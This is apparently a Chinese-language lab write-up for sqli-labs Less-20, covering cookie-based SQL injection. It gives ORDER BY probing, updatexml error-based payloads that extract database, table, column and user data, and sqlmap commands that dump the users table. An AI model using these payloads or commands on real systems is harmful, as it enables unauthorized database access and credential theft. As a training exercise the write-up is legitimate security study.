---
title: less20
url: https://www.yuque.com/u29002979/ep2zrx/yc18zmyfnsngbbzu
---

```bash
$sql="SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1";
$sql="SELECT * FROM users WHERE username='$cookee' LIMIT 0,1";
```

登录之后发现有很明显的**cookie**提示

> YOUR USER AGENT IS : Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36
> YOUR IP ADDRESS IS : 192.168.31.119
> DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE
> YOUR COOKIE : uname = admin and expires: Wed 16 Nov 2022 - 19:23:44
> Your Login name:admin
> Your Password:admin
> Your ID:8

登录之后刷新页面，一定要保证cookie还在存在的前提下进行抓包 &#x20;
`uname = admin' order by 3-- +`
`uname=admin' order by 4-- +`

> Issue with your mysql: Unknown column '4' in 'order clause'

3个字段数 <a name="NTGzZ"></a>

# 报错注入

<a name="X6iZN"></a>

## 爆破数据库名

`uname=admin' union select 1,2,updatexml(1,concat(0x7e,database(),0x7e),1)--+` <a name="DoliG"></a>

## 爆破数据表名

`uname=admin' union select 1,2,updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = database()),0x7e),1)--+` <a name="zblHG"></a>

## 爆破字段名

`uname=admin' union select 1,2,updatexml(1,concat(0x7e,(select (column_name) from information_schema.columns where table_name='users' limit 8,1),0x7e),1)-- +` <a name="IHMXL"></a>

## 爆破字段

`uname=admin' union select 1,2,updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1)-- +`

<a name="Ea4Mq"></a>

# sqlmap cookie注入

```bash
POST /less-20/index.php HTTP/1.1
Host: 192.168.31.193
Content-Length: 0
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36
Origin: http://192.168.31.193
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.31.193/less-20/index.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: uname=admin*
Connection: close
```

打上*  level 等级2

```bash
检测注入点
sqlmap -r 3.txt --batch --level 2
爆破数据库名
sqlmap -r 3.txt --batch --level 2 --current-db
爆破数据表名
sqlmap -r 3.txt --batch --level 2 -D "security" --tables
爆破字段内容
sqlmap -r 3.txt --batch --level 2 -D "security" -T "users" --dump
```
